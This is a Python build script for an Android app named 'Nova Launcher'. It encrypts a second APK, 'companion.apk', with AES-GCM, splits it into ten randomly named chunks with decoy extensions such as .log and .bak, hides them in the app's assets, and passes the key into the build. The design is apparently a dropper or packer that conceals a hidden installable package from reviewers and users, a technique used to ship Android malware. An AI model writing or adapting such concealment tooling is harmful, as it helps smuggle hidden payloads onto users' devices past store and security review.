#!/usr/bin/env python3
"""
encrypt_companion.py — Build-time encryptor for Nova Launcher.

Encrypts companion.apk with AES-256-GCM, splits into 10 random-named chunks,
writes a manifest file listing chunk order, and outputs key for build.yml injection.

Blob layout:  [ 12 bytes IV ][ ciphertext ][ 16 bytes GCM tag ]

Usage:
    python3 tools/encrypt_companion.py <companion.apk> <assets_dir>
"""

import secrets
import string
import sys
import json
from pathlib import Path

try:
    from Crypto.Cipher import AES
except ImportError:
    print("[X] pycryptodome not found. Run: pip install pycryptodome --break-system-packages")
    sys.exit(1)

COMPANION_APK = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("companion.apk")
NOVA_ASSETS   = Path(sys.argv[2]) if len(sys.argv) > 2 else Path("app/src/main/assets")
KEY_FILE      = Path("build/companion_key.txt")

NUM_CHUNKS    = 10
KEY_SIZE      = 32
IV_SIZE       = 12

EXTENSIONS    = [".dat", ".bin", ".tmp", ".pkg", ".raw", ".blob", ".cache", ".bak", ".idx", ".log"]


def random_filename(ext: str) -> str:
    chars = string.ascii_lowercase + string.digits
    name = ''.join(secrets.choice(chars) for _ in range(12))
    return name + ext


def encrypt_blob(data: bytes, key: bytes) -> bytes:
    iv = secrets.token_bytes(IV_SIZE)
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return iv + ciphertext + tag


def split_random(data: bytes, n: int):
    size = len(data)
    # Generate n-1 random split points, sorted
    points = sorted(secrets.randbelow(size - n) + i + 1 for i in range(n - 1))
    chunks = []
    prev = 0
    for pt in points:
        chunks.append(data[prev:pt])
        prev = pt
    chunks.append(data[prev:])
    return chunks


def main():
    if not COMPANION_APK.exists():
        print(f"[X] companion.apk not found at: {COMPANION_APK}")
        sys.exit(1)

    data = COMPANION_APK.read_bytes()
    print(f"[*] Read companion.apk — {len(data):,} bytes")

    if data[:2] != b'PK':
        print("[X] Not a valid APK — PK magic check failed")
        sys.exit(1)
    print("[*] PK magic verified ✓")

    key     = secrets.token_bytes(KEY_SIZE)
    key_hex = key.hex()
    blob    = encrypt_blob(data, key)
    print(f"[*] Encrypted blob: {len(blob):,} bytes")

    chunks   = split_random(blob, NUM_CHUNKS)
    exts     = EXTENSIONS[:]
    secrets.SystemRandom().shuffle(exts)

    NOVA_ASSETS.mkdir(parents=True, exist_ok=True)

    # Remove old chunks if any
    manifest_path = NOVA_ASSETS / "cmap.json"
    if manifest_path.exists():
        old = json.loads(manifest_path.read_text())
        for fname in old.get("chunks", []):
            (NOVA_ASSETS / fname).unlink(missing_ok=True)
        manifest_path.unlink(missing_ok=True)

    chunk_names = []
    for i, chunk in enumerate(chunks):
        ext  = exts[i % len(exts)]
        name = random_filename(ext)
        (NOVA_ASSETS / name).write_bytes(chunk)
        chunk_names.append(name)
        print(f"[OK] Chunk {i+1:02d}: {name} ({len(chunk):,} bytes)")

    # Write manifest (chunk order)
    manifest = {"chunks": chunk_names}
    manifest_path.write_text(json.dumps(manifest), encoding="utf-8")
    print(f"[OK] Manifest → {manifest_path}")

    KEY_FILE.parent.mkdir(parents=True, exist_ok=True)
    KEY_FILE.write_text(key_hex + "\n", encoding="utf-8")
    print(f"[OK] Key saved → {KEY_FILE}")

    print(f"COMPANION_KEY_HEX={key_hex}")

    print()
    print("=" * 55)
    print("  ENCRYPTION COMPLETE — 10 random chunks written")
    print("=" * 55)


if __name__ == "__main__":
    main()
